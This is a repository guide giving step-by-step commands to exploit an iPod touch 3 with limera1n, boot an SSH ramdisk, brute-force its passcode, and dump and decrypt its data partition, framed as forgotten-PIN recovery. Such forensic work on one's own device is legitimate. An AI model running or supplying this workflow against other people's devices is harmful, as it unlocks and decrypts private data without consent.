# Pipeline

The split-machine workflow for tether-booting a custom kernel on a pre-A7 iOS device. Worked example throughout: forgotten-PIN data recovery on an iPod touch 3.

## Why split-machine

The chain has four USB transitions:

1. iPod boots into DFU (`05ac:1227`)
2. limera1n exploits it. Pwned DFU (same product ID, but `PWND:[limera1n]` in the IOKit serial-number string)
3. Patched iBSS+iBEC sent. iPod re-enumerates as Recovery (`05ac:1281`)
4. Kernel + ramdisk sent. iPod re-enumerates as ramdisk (`05ac:1299`)

Each transition is fragile, but in different ways.

| Step | Best machine | Why |
|---|---|---|
| limera1n exploit | Intel Mac or Apple Silicon Mac | AMD desktop CPUs fail the USB heap-overflow race |
| iBSS+iBEC delivery, Recovery enumeration | Linux | macOS plus USB-C-to-USB-A dongle plus third-party 30-pin cable silently drops the re-enumeration |
| Ramdisk boot, iproxy SSH tunnel | Same Linux box | continues from the previous step |

So: pwn on a Mac, swap the cable's USB-A end to a Linux box, finish there. Pwned DFU is RAM resident on the iPod and survives a few-second cable swap as long as the iPod stays battery-powered (don't press any iPod button during the swap).

If you have a genuine Apple 30-pin cable plus a Mac, you can do the whole thing on one machine. The split is for the third-party-cable-on-Apple-Silicon case, which is more common nowadays.

## Prerequisites

One Mac (Intel or Apple Silicon). One Linux box, preferably Intel-based. Both reachable via SSH from your "control" host (where you watch progress). Tailscale or a flat LAN is convenient but not required.

### One-time setup

Mac side:

```sh
# Apple's bundled Python avoids the Homebrew/expat trap (see caveats.md)
/usr/bin/python3 -m pip install --user pyusb

brew install libusb ldid

# Get limera1n-pwner; edit dfu.py to point at brew libusb (its bundled
# libusb-finder doesn't know about macOS 13+)
git clone https://github.com/alfiecg24/limera1n-pwner ~/limera1n-pwner
sed -i '' 's|find_library=lambda x:libusbfinder.libusb1_path()|find_library=lambda x:"/opt/homebrew/opt/libusb/lib/libusb-1.0.dylib"|' \
  ~/limera1n-pwner/dfu.py

# This repo
git clone https://github.com/<you>/pwnboot ~/pwnboot

# Build the bruteforce binary now or later. Needs an iPhoneOS SDK ($THEOS works)
~/pwnboot/build-bruteforce.sh
```

Linux side (Arch example, adjust for your distro):

```sh
sudo pacman -S --needed git curl python python-pyusb usbmuxd usbutils \
                        libimobiledevice libimobiledevice-glue libusb sshpass tmux

# Legacy-iOS-Kit bundles xpwntool, ldid, irecovery, iproxy, etc. as binaries
git clone --depth=1 https://github.com/LukeZGD/Legacy-iOS-Kit ~/Legacy-iOS-Kit
```

## Step-by-step

### 1. Patch the kernelcache (one-time, host side)

Independent of the device. You can do this whenever.

```sh
# Find iv + key for kernelcache.release.<model>:
#   - https://www.theiphonewiki.com/wiki/Firmware_Keys (search build, e.g. 9B206)
#   - or run Legacy-iOS-Kit once and grab from saved/firmware/<device>/<build>/index.html

# Pull the encrypted kernelcache out of the IPSW
~/Legacy-iOS-Kit/bin/macos/arm64/pzb -g \
  Firmware/all_flash/all_flash.<model>ap.production/kernelcache.release.<model> \
  -o kernelcache.encrypted \
  http://appldnld.apple.com/.../<device>_<version>_<build>_Restore.ipsw

# Patch
python3 ~/pwnboot/tools/kc-patch.py \
  kernelcache.encrypted <iv> <key> kernelcache.patched

# Stage in Legacy-iOS-Kit's per-device cache so its --sshrd flow uses ours
mkdir -p ~/Legacy-iOS-Kit/saved/iPod3,1/ramdisk_9B206/
cp kernelcache.patched ~/Legacy-iOS-Kit/saved/iPod3,1/ramdisk_9B206/kernelcache.release.n18
```

Adjust device, build, codename in the path for your hardware.

### 2. Build the bruteforce binary (one-time, host side)

```sh
cd ~/pwnboot
./build-bruteforce.sh
# Output: ./build/bruteforce-fixed
```

### 3. Get the iPod into DFU on the Mac

Cable plugged into Mac. Hold Power+Home for 10 seconds. Release Power. Keep holding Home for 10-15 more seconds. Release.

Verify:

```sh
ioreg -p IOUSB -l | grep -E "USB Product Name|idProduct" | head -5
```

You should see `Apple Mobile Device (DFU Mode)` and `idProduct = 4647` (= 0x1227).

### 4. limera1n exploit (Mac)

```sh
cd ~/limera1n-pwner
for i in $(seq 1 8); do
  out=$(echo "" | /usr/bin/python3 limera1nPwner 2>&1)
  if echo "$out" | grep -q "PWND:\|now in pwned"; then
    echo "PWNED on attempt $i"; break
  fi
done
```

Verify:

```sh
ioreg -p IOUSB -l | grep PWND
# kUSBSerialNumberString = "...PWND:[limera1n]"
```

### 5. Cable swap to Linux

Unplug the cable's USB-A end from the Mac (or its dongle). Plug into a USB-A port on the Linux box. Don't disconnect the 30-pin from the iPod. Don't press any iPod button. The whole swap should take a few seconds.

If Linux's USB controller fails to enumerate the device (`Cannot enable. Maybe the USB cable is bad?` in `dmesg`, which on most distros needs `sudo dmesg` or `sysctl kernel.dmesg_restrict=0`), unplug, wait a few seconds, plug into a different USB-A port. Pwned DFU is fine with this as long as the iPod stays powered on its battery.

Verify on Linux:

```sh
lsusb | grep -i apple
# Bus 001 Device 005: ID 05ac:1227 Apple, Inc. Mobile Device (DFU Mode)

cat /sys/bus/usb/devices/*/serial 2>/dev/null | grep PWND
# CPID:8922 ... PWND:[limera1n]
```

### 6. Boot the SSH ramdisk (Linux)

```sh
cd ~/Legacy-iOS-Kit
bash restore.sh --sshrd --device=iPod3,1 --no-color
```

This runs for a couple minutes. Auto-detects pwned DFU, skips its own pwn step. Sends iBSS, iBEC, ramdisk, DeviceTree, kernelcache (our patched copy from `saved/...`). Starts `iproxy` listening on local port 6414, forwarding to the iPod's port 22.

The iPod will briefly show an Apple logo plus spinning wheel during boot, then go dark. That's normal. The kernel and ramdisk are loaded, you just lost the verbose-boot flag somewhere.

### 7. SSH in and brute-force

```sh
sshpass -p alpine scp -P 6414 \
  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa \
  -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null \
  ~/pwnboot/build/bruteforce-fixed root@127.0.0.1:/var/root/bruteforce

sshpass -p alpine ssh -p 6414 \
  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa \
  -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null \
  root@127.0.0.1 \
  'chmod +x /var/root/bruteforce; /var/root/bruteforce -u'
```

The `-u` matters. Without it, the AKS-based brute-force runs but silently fails to find the PIN (caveats.md #7). With `-u`, you get progress lines (`0000`, `0001`, ...) and `Found passcode : XXXX` typically within 30-60 seconds.

The binary writes a plist with all derived class keys to `/var/root/<keybag-uuid>.plist`. Copy it back:

```sh
sshpass -p alpine scp -P 6414 \
  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa \
  -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null \
  'root@127.0.0.1:/var/root/*.plist' .
```

### 8. (Optional) Dump the data partition for offline decryption

If you also want files protected by `NSFileProtectionComplete` (Mail Protected Index, keychain, app-specific sqlites), they're encrypted-at-rest with class keys you now have. Mounted reads of those files still fail (kernel applies `MNT_PROTECT` to the partition), so dump the raw bytes instead:

```sh
# First unmount the data partition if it's mounted (e.g. by mount.sh).
# Build umount with the same toolchain as bruteforce:
clang -arch armv7 -isysroot $IPHONEOS_SDK -miphoneos-version-min=6.0 \
  -Wl,-no_pie -Wl,-e,_start -o umount ~/pwnboot/tools/start.S ~/pwnboot/tools/umount.c
python3 ~/pwnboot/tools/lc_main_to_unixthread.py umount umount-fixed
ldid -S umount-fixed

# Push and run on the iPod
sshpass -p alpine scp -P 6414 ... umount-fixed root@127.0.0.1:/var/root/umount
sshpass -p alpine ssh ... root@127.0.0.1 \
  'chmod +x /var/root/umount; /var/root/umount /mnt2'

# Now the device is free. dd the raw partition. bs=8192 on rdisk* is the
# magic incantation. bs=4096 or 16M will EINVAL (caveats.md #8)
sshpass -p alpine ssh -p 6414 \
  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa \
  -oCompression=no -caes128-ctr \
  -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null \
  root@127.0.0.1 'dd if=/dev/rdisk0s1s2 bs=8192' \
  > data-partition.img
# 30 GB partition, ~3 MB/s through iproxy/SSH = 2.5 to 3 hours
```

Then run Sogeti's offline `emf_decrypter.py` with the keybag plist plus this image to decrypt every file.

## Recovery from various breakages

Pwn fails on Mac repeatedly: retry up to ~10 times. limera1n is a heap-overflow race. If it never lands, try a genuine Apple 30-pin cable, restart the Mac, or use a different machine.

iPod falls out of DFU during pwn attempts: force-power-off (hold Power 10s), redo the DFU button sequence. Some pwn implementations reset the device on failure and persistent retries can knock it out of DFU. `alfiecg24/limera1n-pwner` is gentler than Legacy-iOS-Kit's `primepwn` here.

Linux can't see the iPod after the cable swap: unplug, replug. If still not visible, try a different USB-A port.

`Cannot enable. Maybe the USB cable is bad?` in `dmesg`: same fix, replug.

Ramdisk boot fails (Legacy-iOS-Kit times out at "Finding device in Recovery mode"): USB transition failed (caveats.md hardware section). Try a different cable or USB hub or machine.

Bruteforce exits with "FAILed to load keybag": `/mnt2` isn't mounted, or it's mounted at the wrong path. Run `/bin/mount.sh` (no args) before running bruteforce.

## Cleanup

When you're done:

- Power-cycle the iPod (hold Power 5+ seconds). Returns it to its locked iOS state, RAM cleared, no traces of the ramdisk.
- The on-disk filesystem is untouched throughout. You've only ever read.
- Delete the keybag plist files unless you want them for offline decryption.
- The patched kernelcache in `~/Legacy-iOS-Kit/saved/...` can stay. It'll be reused next time, or overwritten if you `rm` the saved/ directory.
